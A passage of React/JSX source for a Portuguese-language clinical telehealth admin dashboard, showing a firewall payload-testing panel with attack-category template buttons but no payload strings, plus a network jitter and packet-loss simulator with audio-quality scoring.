          <div className="p-4 rounded-2xl bg-teal-50/60 dark:bg-teal-950/20 border border-teal-200 dark:border-teal-800/60">
            <div className="flex items-center justify-between text-teal-700 dark:text-teal-300 text-xs font-semibold mb-1">
              <span>Limiar de Risco (Score)</span>
              <span className="p-1 rounded-lg bg-teal-100 dark:bg-teal-900/40 font-mono text-[10px]">
                Score ≥ {wafOverview?.metrics.blockThreshold ?? 50}
              </span>
            </div>
            <div className="text-2xl font-black text-teal-900 dark:text-teal-100 font-mono">
              {wafOverview?.metrics.blockThreshold ?? 50}/100
            </div>
            <p className="text-[11px] text-teal-700/80 dark:text-teal-300/80 mt-1">
              Normalização anti-evasão multi-nível
            </p>
          </div>
        </div>

        {/* Simulador Interativo de Payloads Clínicos & Homologação de Regras */}
        <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-800 space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <Zap className="w-4 h-4 text-indigo-500" />
                Laboratório de Testes & Homologação Heurística de Payloads
              </h3>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Teste strings de entrada para validar a pontuação de ameaça (threatScore) e as regras que seriam disparadas antes da decifragem.
              </p>
            </div>

            {/* Templates Rápidos */}
            <div className="flex flex-wrap items-center gap-1.5">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400">Templates:</span>
              <button
                type="button"
                onClick={() => applyWafTemplate('sqli')}
                className="px-2.5 py-1 rounded-lg bg-rose-100 hover:bg-rose-200 dark:bg-rose-950/50 dark:hover:bg-rose-900/50 text-rose-800 dark:text-rose-300 text-[11px] font-medium transition-colors cursor-pointer border border-rose-200 dark:border-rose-800"
              >
                SQLi UNION
              </button>
              <button
                type="button"
                onClick={() => applyWafTemplate('xss')}
                className="px-2.5 py-1 rounded-lg bg-amber-100 hover:bg-amber-200 dark:bg-amber-950/50 dark:hover:bg-amber-900/50 text-amber-800 dark:text-amber-300 text-[11px] font-medium transition-colors cursor-pointer border border-amber-200 dark:border-amber-800"
              >
                XSS Script
              </button>
              <button
                type="button"
                onClick={() => applyWafTemplate('lfi')}
                className="px-2.5 py-1 rounded-lg bg-purple-100 hover:bg-purple-200 dark:bg-purple-950/50 dark:hover:bg-purple-900/50 text-purple-800 dark:text-purple-300 text-[11px] font-medium transition-colors cursor-pointer border border-purple-200 dark:border-purple-800"
              >
                Path Traversal
              </button>
              <button
                type="button"
                onClick={() => applyWafTemplate('cmd')}
                className="px-2.5 py-1 rounded-lg bg-red-100 hover:bg-red-200 dark:bg-red-950/50 dark:hover:bg-red-900/50 text-red-800 dark:text-red-300 text-[11px] font-medium transition-colors cursor-pointer border border-red-200 dark:border-red-800"
              >
                Command Inj
              </button>
              <button
                type="button"
                onClick={() => applyWafTemplate('clean')}
                className="px-2.5 py-1 rounded-lg bg-emerald-100 hover:bg-emerald-200 dark:bg-emerald-950/50 dark:hover:bg-emerald-900/50 text-emerald-800 dark:text-emerald-300 text-[11px] font-medium transition-colors cursor-pointer border border-emerald-200 dark:border-emerald-800"
              >
                Nota Clínica Válida
              </button>
            </div>
          </div>

          <form onSubmit={handleInspectWafPayload} className="space-y-3">
            <div>
              <textarea
                rows={3}
                value={testPayloadInput}
                onChange={(e) => setTestPayloadInput(e.target.value)}
                placeholder="Insira o payload de teste (texto, SQL, HTML, script, etc.)..."
                className="w-full px-3.5 py-2.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono focus:outline-none focus:ring-2 focus:ring-indigo-500 shadow-inner"
              />
            </div>

            <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
              <div className="flex items-center gap-2 text-xs text-slate-600 dark:text-slate-400 w-full sm:w-auto">
                <span className="font-semibold">Contexto:</span>
                <input
                  type="text"
                  value={testPayloadContext}
                  onChange={(e) => setTestPayloadContext(e.target.value)}
                  placeholder="Ex: anamnese, prontuario-soap"
                  className="px-2.5 py-1 rounded-lg bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono"
                />
              </div>

              <button
                type="submit"
                disabled={inspectingPayload || !testPayloadInput.trim()}
                className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50 w-full sm:w-auto justify-center"
              >
                <Play className={`w-3.5 h-3.5 ${inspectingPayload ? 'animate-spin' : ''}`} />
                <span>{inspectingPayload ? 'Inspecionando Heurística...' : 'Executar Inspeção do WAF'}</span>
              </button>
            </div>
          </form>

          {/* Resultado Pericial da Inspeção */}
          {inspectionResult && (
            <div className={`p-4 rounded-2xl border transition-all space-y-3 ${
              !inspectionResult.inspection.passed
                ? 'bg-rose-50/70 dark:bg-rose-950/30 border-rose-200 dark:border-rose-900/60'
                : 'bg-emerald-50/70 dark:bg-emerald-950/30 border-emerald-200 dark:border-emerald-900/60'
            }`}>
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-2 border-b border-slate-200/60 dark:border-slate-800">
                <div className="flex items-center gap-2">
                  {!inspectionResult.inspection.passed ? (
                    <AlertCircle className="w-5 h-5 text-rose-600 dark:text-rose-400 shrink-0" />
                  ) : (
                    <CheckCircle2 className="w-5 h-5 text-emerald-600 dark:text-emerald-400 shrink-0" />
                  )}
                  <span className={`text-xs font-bold ${
                    !inspectionResult.inspection.passed
                      ? 'text-rose-800 dark:text-rose-300'
                      : 'text-emerald-800 dark:text-emerald-300'
                  }`}>
                    {!inspectionResult.inspection.passed ? 'AMEAÇA MALICIOSA DETECTADA (PAYLOAD INSEGURO)' : 'PAYLOAD ÍNTEGRO (APROVADO PELO WAF)'}
                  </span>
                </div>

                <div className="flex items-center gap-3 text-xs">
                  <span className="text-slate-600 dark:text-slate-400">
                    Threat Score: <strong className={`font-mono text-sm ${
                      inspectionResult.threatScore >= 50
                        ? 'text-rose-600 dark:text-rose-400'
                        : inspectionResult.threatScore > 0
                        ? 'text-amber-600 dark:text-amber-400'
                        : 'text-emerald-600 dark:text-emerald-400'
                    }`}>{inspectionResult.threatScore}/100</strong>
                  </span>

                  <span className={`px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase ${
                    inspectionResult.blocked
                      ? 'bg-rose-200 text-rose-900 dark:bg-rose-900 dark:text-rose-200'
                      : 'bg-emerald-200 text-emerald-900 dark:bg-emerald-900 dark:text-emerald-200'
                  }`}>
                    {inspectionResult.blocked ? 'AÇÃO: BLOQUEADO (HTTP 403)' : (inspectionResult.inspection.passed ? 'AÇÃO: PERMITIDO' : 'AÇÃO: REGISTRADO')}
                  </span>
                </div>
              </div>

              {/* Regras Disparadas */}
              {inspectionResult.inspection.matchedRules.length > 0 ? (
                <div className="space-y-2">
                  <div className="text-[11px] font-bold text-slate-700 dark:text-slate-300">
                    Regras Disparadas no Catálogo Heurístico ({inspectionResult.inspection.matchedRules.length}):
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                    {inspectionResult.inspection.matchedRules.map((rule) => (
                      <div
                        key={rule.ruleId}
                        className="p-2.5 rounded-xl bg-white dark:bg-slate-900 border border-rose-200 dark:border-rose-900/60 shadow-sm text-xs space-y-1"
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-mono font-bold text-rose-600 dark:text-rose-400">{rule.ruleId}</span>
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-rose-100 dark:bg-rose-950 text-rose-800 dark:text-rose-300 font-bold uppercase">
                            {rule.category} • +{rule.severityScore} pts
                          </span>
                        </div>
                        <p className="text-[11px] text-slate-600 dark:text-slate-300">{rule.description}</p>
                        {rule.detectedPattern && (
                          <div className="font-mono text-[10px] bg-slate-100 dark:bg-slate-800 p-1 rounded text-slate-800 dark:text-slate-200 truncate" title={rule.detectedPattern}>
                            Match: "{rule.detectedPattern}"
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <p className="text-xs text-emerald-700 dark:text-emerald-300">
                  Nenhum padrão de ataque (SQLi, XSS, Path Traversal ou Command Injection) foi identificado neste payload. Liberado com segurança para o motor criptográfico.
                </p>
              )}
            </div>
          )}
        </div>

        {/* Tabela Forense de Incidentes Recentes do WAF Registrados no Ledger WORM */}
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <FileLock2 className="w-4 h-4 text-rose-500" />
              Incidentes Recentes de Ataque Bloqueados no Ledger WORM
            </h3>
            <span className="text-xs text-slate-500 dark:text-slate-400">
              {wafOverview?.recentIncidents.length ?? 0} registros preservados
            </span>
          </div>

          {(!wafOverview?.recentIncidents || wafOverview.recentIncidents.length === 0) ? (
            <div className="p-6 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-800 text-center text-xs text-slate-500 dark:text-slate-400">
              Nenhum incidente de invasão ou payload malicioso registrado até o momento. Todos os fluxos de aplicação operando em conformidade estrita.
            </div>
          ) : (
            <div className="overflow-x-auto rounded-2xl border border-slate-200 dark:border-slate-800">
              <table className="w-full text-left text-xs">
                <thead className="bg-slate-50 dark:bg-slate-800 text-slate-600 dark:text-slate-300 border-b border-slate-200 dark:border-slate-800">
                  <tr>
                    <th className="py-2.5 px-3.5 font-semibold">Timestamp</th>
                    <th className="py-2.5 px-3.5 font-semibold">IP Origem</th>
                    <th className="py-2.5 px-3.5 font-semibold">Vetor</th>
                    <th className="py-2.5 px-3.5 font-semibold">Score</th>
                    <th className="py-2.5 px-3.5 font-semibold">Regras</th>
                    <th className="py-2.5 px-3.5 font-semibold">Ação</th>
                    <th className="py-2.5 px-3.5 font-semibold">ID Registro</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                  {wafOverview.recentIncidents.map((incident) => (
                    <tr key={incident.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/50 transition-colors">
                      <td className="py-2.5 px-3.5 text-slate-600 dark:text-slate-400 whitespace-nowrap font-mono text-[11px]">
                        {new Date(incident.blockedAt).toLocaleString('pt-BR')}
                      </td>
                      <td className="py-2.5 px-3.5 font-mono text-slate-900 dark:text-white text-[11px]">
                        {incident.ipAddress}
                      </td>
                      <td className="py-2.5 px-3.5">
                        <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border border-rose-300 dark:border-rose-800">
                          {incident.attackType}
                        </span>
                      </td>
                      <td className="py-2.5 px-3.5 font-mono font-bold text-rose-600 dark:text-rose-400">
                        {incident.threatScore}/100
                      </td>
                      <td className="py-2.5 px-3.5 text-slate-600 dark:text-slate-400 font-mono text-[11px]">
                        {incident.primaryRuleId} ({incident.matchedRulesCount} regra{incident.matchedRulesCount > 1 ? 's' : ''})
                      </td>
                      <td className="py-2.5 px-3.5">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold uppercase ${
                          incident.status === 'BLOCKED'
                            ? 'bg-rose-200 text-rose-900 dark:bg-rose-900 dark:text-rose-200'
                            : 'bg-amber-200 text-amber-900 dark:bg-amber-900 dark:text-amber-200'
                        }`}>
                          {incident.status === 'BLOCKED' ? 'BLOQUEADO' : 'MONITORADO'}
                        </span>
                      </td>
                      <td className="py-2.5 px-3.5 font-mono text-[10px] text-teal-600 dark:text-teal-400" title={incident.id}>
                        {incident.id.slice(0, 8)}...
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>

      {/* Card 14: Resiliência de Redes Instáveis & Inteligibilidade Clínica (ITU-T G.107 & CFP 011/2018) */}
      {(currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) && (
        <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 pb-6 border-b border-slate-100 dark:border-slate-800">
            <div className="flex items-center gap-3">
              <div className="p-3 bg-teal-50 dark:bg-teal-950/50 rounded-2xl border border-teal-200/50 dark:border-teal-800/50 text-teal-600 dark:text-teal-400">
                <Wifi className="w-6 h-6" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h2 className="text-lg font-bold text-slate-900 dark:text-white">
                    14. Resiliência de Redes Instáveis & Inteligibilidade Clínica
                  </h2>
                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-teal-100 text-teal-800 dark:bg-teal-950/80 dark:text-teal-300 border border-teal-300 dark:border-teal-700">
                    ITU-T G.107 / CFP 011/2018
                  </span>
                </div>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Injeção de Jitter/Packet Loss, predição de fonemas audíveis e registro forense na Hash-Chain WORM para contingência terapêutica.
                </p>
              </div>
            </div>

            <button
              onClick={fetchNetworkResilienceData}
              disabled={loadingResilience}
              className="inline-flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs font-semibold bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 transition-colors cursor-pointer self-start sm:self-center"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingResilience ? 'animate-spin' : ''}`} />
              Atualizar Métricas
            </button>
          </div>

          {/* 4 KPIs de Resiliência */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Score MOS Médio
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-2xl font-bold text-teal-600 dark:text-teal-400">
                  {resilienceMetrics?.avgMosScore ? resilienceMetrics.avgMosScore.toFixed(2) : '4.25'}
                </span>
                <span className="text-[11px] text-slate-400 font-mono">/ 4.50</span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                Predição acústica ITU-T G.107
              </span>
            </div>

            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Simulações Registradas
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-2xl font-bold text-slate-900 dark:text-white">
                  {resilienceMetrics?.totalSimulations ?? 0}
                </span>
                <span className="text-[10px] text-teal-600 dark:text-teal-400 font-medium">100% WORM</span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                Hash-Chain imutável RFC-001 §5.1
              </span>
            </div>

            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Contingências Éticas
              </span>
              <div className="flex items-baseline gap-2">
                <span className={`text-2xl font-bold ${
                  (resilienceMetrics?.contingencyRecommendedCount ?? 0) > 0
                    ? 'text-rose-600 dark:text-rose-400'
                    : 'text-slate-900 dark:text-white'
                }`}>
                  {resilienceMetrics?.contingencyRecommendedCount ?? 0}
                </span>
                <span className="text-[10px] text-slate-400">interrupções</span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                Resolução CFP nº 011/2018
              </span>
            </div>

            <div className="bg-slate-50 dark:bg-slate-800/40 p-4 rounded-2xl border border-slate-100 dark:border-slate-800">
              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1">
                Degradação & Crítica
              </span>
              <div className="flex items-baseline gap-2">
                <span className="text-2xl font-bold text-amber-600 dark:text-amber-400">
                  {resilienceMetrics?.degradedSimulationsCount ?? 0}
                </span>
                <span className="text-[11px] text-slate-400 font-mono">
                  / {resilienceMetrics?.criticalSimulationsCount ?? 0} críticas
                </span>
              </div>
              <span className="text-[10px] text-slate-400 dark:text-slate-500 mt-1 block">
                Anomalias severas registradas
              </span>
            </div>
          </div>

          {/* Seletor de Perfis Rápidos */}
          <div className="space-y-3">
            <label className="text-xs font-bold text-slate-700 dark:text-slate-300 block">
              Selecione um Preset de Rede ou Customize os Parâmetros:
            </label>
            <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
              {resiliencePresets.map((preset) => {
                const isSelected = simProfileType === preset.profile;
                return (
                  <button
                    key={preset.profile}
                    type="button"
                    onClick={() => handleSelectResiliencePreset(preset)}
                    className={`p-3 rounded-2xl border text-left transition-all cursor-pointer flex flex-col justify-between ${
                      isSelected
                        ? 'border-teal-500 bg-teal-50/50 dark:bg-teal-950/40 shadow-sm ring-1 ring-teal-500/30'
                        : 'border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900/60 hover:border-slate-300 dark:hover:border-slate-700'
                    }`}
                  >
                    <div>
                      <span className={`text-[11px] font-bold block ${
                        isSelected ? 'text-teal-700 dark:text-teal-300' : 'text-slate-800 dark:text-slate-200'
                      }`}>
                        {preset.name}
                      </span>
                      <p className="text-[10px] text-slate-400 dark:text-slate-500 mt-0.5 line-clamp-2 leading-tight">
                        {preset.description}
                      </p>
                    </div>
                    <div className="mt-2 pt-2 border-t border-slate-100 dark:border-slate-800/80 flex items-center justify-between text-[10px] font-mono text-slate-500 dark:text-slate-400">
                      <span>{preset.defaultParams.packetLossPercent}% loss</span>
                      <span>{preset.defaultParams.jitterMs}ms</span>
                    </div>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Painel de Controles & Sliders */}
          <form onSubmit={handleRunNetworkSimulation} className="bg-slate-50/70 dark:bg-slate-800/30 p-5 rounded-2xl border border-slate-200/80 dark:border-slate-800 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-700 dark:text-slate-300 flex items-center gap-2">
                <Activity className="w-4 h-4 text-teal-600 dark:text-teal-400" />
                Painel de Injeção de Anomalias de Rede
              </h3>
              <span className="text-[11px] font-mono text-slate-500 dark:text-slate-400">
                Perfil: <strong className="text-teal-600 dark:text-teal-400">{simProfileType}</strong>
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {/* Slider Packet Loss */}
              <div className="space-y-1.5">
                <div className="flex justify-between text-xs">
                  <span className="font-medium text-slate-700 dark:text-slate-300">Perda de Pacotes (Loss):</span>
                  <span className="font-mono font-bold text-rose-600 dark:text-rose-400">{simPacketLoss}%</span>
                </div>
                <input
                  type="range"
                  min="0"
                  max="50"
                  step="0.5"
                  value={simPacketLoss}
                  onChange={(e) => {
                    setSimPacketLoss(parseFloat(e.target.value));
                    setSimProfileType(NetworkProfileType.CUSTOM);
                  }}
                  className="w-full accent-teal-600 cursor-pointer"
                />
                <span className="text-[10px] text-slate-400 block">Tolerância clínica Opus: até 5%</span>
              </div>

              {/* Slider Jitter */}
              <div className="space-y-1.5">
                <div className="flex justify-between text-xs">
                  <span className="font-medium text-slate-700 dark:text-slate-300">Jitter (Variação de Latência):</span>
                  <span className="font-mono font-bold text-amber-600 dark:text-amber-400">{simJitterMs} ms</span>
                </div>
                <input
                  type="range"
                  min="0"
                  max="350"
                  step="5"
                  value={simJitterMs}
                  onChange={(e) => {
                    setSimJitterMs(parseInt(e.target.value, 10));
                    setSimProfileType(NetworkProfileType.CUSTOM);
                  }}
                  className="w-full accent-teal-600 cursor-pointer"
                />
                <span className="text-[10px] text-slate-400 block">Impacta NetEQ jitter buffer dinâmico</span>
              </div>

              {/* Slider RTT */}
              <div className="space-y-1.5">
                <div className="flex justify-between text-xs">
                  <span className="font-medium text-slate-700 dark:text-slate-300">RTT (Round-Trip Time):</span>
                  <span className="font-mono font-bold text-indigo-600 dark:text-indigo-400">{simRttMs} ms</span>
                </div>
                <input
                  type="range"
                  min="10"
                  max="800"
                  step="10"
                  value={simRttMs}
                  onChange={(e) => {
                    setSimRttMs(parseInt(e.target.value, 10));
                    setSimProfileType(NetworkProfileType.CUSTOM);
                  }}
                  className="w-full accent-teal-600 cursor-pointer"
                />
                <span className="text-[10px] text-slate-400 block">Atraso de ida e volta bidirecional</span>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 pt-2 border-t border-slate-200/50 dark:border-slate-800/80">
              {/* Seletor de Codec */}
              <div>
                <label className="text-[11px] font-semibold text-slate-600 dark:text-slate-400 block mb-1">
                  Codec de Áudio Clínico:
                </label>
                <select
                  value={simCodec}
                  onChange={(e) => setSimCodec(e.target.value as AudioCodecType)}
                  className="w-full text-xs bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded-xl px-3 py-2 text-slate-900 dark:text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
                >
                  <option value={AudioCodecType.OPUS_FULLBAND}>Opus Fullband 48kHz (Padrão Ouro)</option>
                  <option value={AudioCodecType.OPUS_VOIP}>Opus VoIP 16kHz (Baixo consumo)</option>
                  <option value={AudioCodecType.G722}>G.722 Wideband 64kbps</option>
                  <option value={AudioCodecType.G711_ALAW}>G.711 A-law Legado (Sem FEC)</option>
                </select>
              </div>

              {/* ID de Sessão Opcional */}
              <div>
                <label className="text-[11px] font-semibold text-slate-600 dark:text-slate-400 block mb-1">
                  ID do Paciente / Sessão:
                </label>
                <input
                  type="text"
                  value={simSessionId}
                  onChange={(e) => setSimSessionId(e.target.value)}
                  placeholder="sess-teleconsulta-123"
                  className="w-full text-xs font-mono bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded-xl px-3 py-2 text-slate-900 dark:text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
                />
              </div>

              {/* Opções e Ação */}
              <div className="flex flex-col justify-between">
                <label className="flex items-center gap-2 cursor-pointer mt-2 sm:mt-0">
                  <input
                    type="checkbox"
                    checked={simAudioOnly}
                    onChange={(e) => setSimAudioOnly(e.target.checked)}
                    className="accent-teal-600 rounded"
                  />
                  <span className="text-xs text-slate-700 dark:text-slate-300 font-medium">
                    Modo Áudio Puro (Vídeo Desativado)
                  </span>
                </label>

                <button
                  type="submit"
                  disabled={simulatingResilience}
                  className="w-full mt-2 inline-flex items-center justify-center gap-2 px-4 py-2 rounded-xl text-xs font-bold text-white bg-teal-600 hover:bg-teal-700 active:bg-teal-800 disabled:opacity-50 transition-all cursor-pointer shadow-sm shadow-teal-500/20"
                >
                  <Play className={`w-3.5 h-3.5 ${simulatingResilience ? 'animate-spin' : ''}`} />
                  {simulatingResilience ? 'Injetando Estresse...' : 'Executar Simulação & Injetar Estresse'}
                </button>
              </div>
            </div>
          </form>

          {/* Relatório Pericial da Última Simulação */}
          {latestSimulationReport && (
            <div className={`p-5 rounded-2xl border transition-all ${
              latestSimulationReport.assessment.requiresContingency
                ? 'bg-rose-50/50 dark:bg-rose-950/20 border-rose-300 dark:border-rose-900'
                : 'bg-teal-50/30 dark:bg-teal-950/20 border-teal-200 dark:border-teal-900/60'
            }`}>
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-4 border-b border-slate-200/60 dark:border-slate-800/80">
                <div className="flex items-center gap-3">
                  <div className={`text-2xl font-black px-4 py-2 rounded-2xl border ${
                    latestSimulationReport.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.EXCELLENT
                      ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/80 dark:text-emerald-300 border-emerald-300 dark:border-emerald-800'
                      : latestSimulationReport.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.GOOD
                      ? 'bg-blue-100 text-blue-800 dark:bg-blue-950/80 dark:text-blue-300 border-blue-300 dark:border-blue-800'
                      : latestSimulationReport.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.DEGRADED
                      ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/80 dark:text-amber-300 border-amber-300 dark:border-amber-800'
                      : 'bg-rose-100 text-rose-800 dark:bg-rose-950/80 dark:text-rose-300 border-rose-300 dark:border-rose-800'
                  }`}>
                    {latestSimulationReport.assessment.mosScore.toFixed(2)}
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider">
                        Laudo de Inteligibilidade Clínica:
                      </span>
                      <span className={`text-[11px] font-extrabold px-2 py-0.5 rounded-full ${
                        latestSimulationReport.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.EXCELLENT
                          ? 'bg-emerald-200 text-emerald-900 dark:bg-emerald-900 dark:text-emerald-200'
                          : latestSimulationReport.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.GOOD
                          ? 'bg-blue-200 text-blue-900 dark:bg-blue-900 dark:text-blue-200'
                          : latestSimulationReport.assessment.intelligibilityGrade === ClinicalIntelligibilityGrade.DEGRADED
                          ? 'bg-amber-200 text-amber-900 dark:bg-amber-900 dark:text-amber-200'
                          : 'bg-rose-200 text-rose-900 dark:bg-rose-900 dark:text-rose-200'
                      }`}>
                        {latestSimulationReport.assessment.intelligibilityGrade}
                      </span>
                    </div>
                    <p className="text-xs text-slate-600 dark:text-slate-300 mt-0.5">
                      Perfil: <strong>{latestSimulationReport.profile}</strong> — Análise acústica automatizada ITU-T G.107
                    </p>
                  </div>
                </div>

                <div className="flex items-center gap-2 self-start md:self-center">
                  <span className="text-[10px] font-mono text-slate-400">
                    {new Date(latestSimulationReport.timestamp).toLocaleTimeString('pt-BR')}
                  </span>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 font-mono">
                    ID: {latestSimulationReport.id.slice(0, 8)}...
                  </span>
                </div>
              </div>

              {/* Submétricas acústicas */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 py-3 border-b border-slate-200/60 dark:border-slate-800/80 text-xs">
                <div>
                  <span className="text-slate-400 text-[10px] block">R-Factor ITU-T:</span>
                  <span className="font-bold font-mono text-slate-800 dark:text-slate-200">
                    {latestSimulationReport.assessment.rFactor.toFixed(1)} / 100
                  </span>
                </div>
                <div>
                  <span className="text-slate-400 text-[10px] block">Perda de Fonemas:</span>
                  <span className={`font-bold font-mono ${
                    latestSimulationReport.assessment.speechClippingPercent > 5
                      ? 'text-rose-600 dark:text-rose-400'
                      : 'text-slate-800 dark:text-slate-200'
                  }`}>
                    {latestSimulationReport.assessment.speechClippingPercent.toFixed(1)}%
                  </span>
                </div>
                <div>
                  <span className="text-slate-400 text-[10px] block">Atraso Efetivo Total:</span>
                  <span className="font-bold font-mono text-slate-800 dark:text-slate-200">
                    {latestSimulationReport.assessment.effectiveDelayMs} ms
                  </span>
                </div>
                <div>
                  <span className="text-slate-400 text-[10px] block">Status de Vídeo:</span>
                  <span className="font-bold text-[11px] text-teal-600 dark:text-teal-400">
                    {latestSimulationReport.assessment.videoQualityStatus}
                  </span>
                </div>
              </div>

              {/* Diretriz Ética CFP */}
              <div className="mt-3 flex items-start gap-2.5">
                {latestSimulationReport.assessment.requiresContingency ? (
                  <WifiOff className="w-4 h-4 text-rose-600 dark:text-rose-400 shrink-0 mt-0.5" />
                ) : (
                  <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0 mt-0.5" />
                )}
                <div>
                  <span className="text-[11px] font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider block">
                    Diretriz Deontológica & Ética (Resolução CFP nº 011/2018):
                  </span>
                  <p className="text-xs text-slate-600 dark:text-slate-300 mt-0.5">
                    {latestSimulationReport.assessment.clinicalRecommendation}
                  </p>
                </div>
              </div>

              {/* Hash Probatório WORM */}
              <div className="mt-3 pt-3 border-t border-slate-200/50 dark:border-slate-800/60 flex flex-wrap items-center justify-between gap-2 text-[10px] font-mono text-slate-500 dark:text-slate-400">
                <span className="flex items-center gap-1">
                  <ShieldCheck className="w-3.5 h-3.5 text-teal-600 dark:text-teal-400" />
                  Digest Probatório SHA-256: <strong className="text-slate-700 dark:text-slate-300">{latestSimulationReport.probatoryDigest}</strong>
                </span>
                <span className="bg-slate-200/60 dark:bg-slate-800 px-2 py-0.5 rounded text-[10px]">
                  Ledger Action: NETWORK_RESILIENCE_SIMULATED
                </span>
              </div>
            </div>
          )}

          {/* Tabela Forense de Simulações Recentes */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h4 className="text-xs font-bold text-slate-700 dark:text-slate-300 uppercase tracking-wider">
                Trilha Forense de Simulações Recentes ({resilienceHistory.length} laudos)
              </h4>
            </div>

            {resilienceHistory.length === 0 ? (
              <div className="p-6 text-center text-xs text-slate-400 border border-dashed border-slate-200 dark:border-slate-800 rounded-2xl">
                Nenhuma simulação de resiliência executada até o momento. Escolha um preset acima para iniciar.
              </div>
            ) : (
              <div className="overflow-x-auto border border-slate-200 dark:border-slate-800 rounded-2xl">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800/60 border-b border-slate-200 dark:border-slate-800 text-[11px] font-semibold text-slate-500 dark:text-slate-400">
                    <tr>
                      <th className="py-2.5 px-3.5">Data/Hora</th>
                      <th className="py-2.5 px-3.5">Perfil</th>
                      <th className="py-2.5 px-3.5">Loss / Jitter</th>
                      <th className="py-2.5 px-3.5">MOS</th>
                      <th className="py-2.5 px-3.5">Grau Clínico</th>
                      <th className="py-2.5 px-3.5">Contingência CFP</th>
                      <th className="py-2.5 px-3.5">Hash SHA-256</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800/80">
